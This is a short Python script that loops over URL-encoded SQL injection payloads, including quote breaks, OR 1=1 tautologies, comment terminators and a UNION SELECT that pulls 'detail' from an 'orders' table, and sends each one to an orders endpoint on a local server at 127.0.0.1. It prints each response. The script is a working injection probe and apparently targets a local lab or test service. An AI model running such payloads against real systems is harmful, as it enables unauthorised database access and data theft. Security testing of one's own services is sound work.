import urllib.request
B="http://127.0.0.1:8897/orders/"
def g(p):
    try:
        r=urllib.request.urlopen(B+p,timeout=10); print(r.status, r.read().decode()[:300], "|", p)
    except urllib.error.HTTPError as e: print(e.code, e.read().decode()[:200], "|", p)
for p in ["1001%27","1001%27%20OR%20%271%27%3D%271","1001%27--","1001%27%20OR%201%3D1--",
          "1001%20OR%201%3D1","0%20OR%201%3D1","1001%27%20OR%20%271%27%3D%271%27--",
          "%27%20OR%20%271%27%3D%271","1001%27%20UNION%20SELECT%20detail%20FROM%20orders--",
          "1001%27%20UNION%20SELECT%201,2--"]:
    g(p)
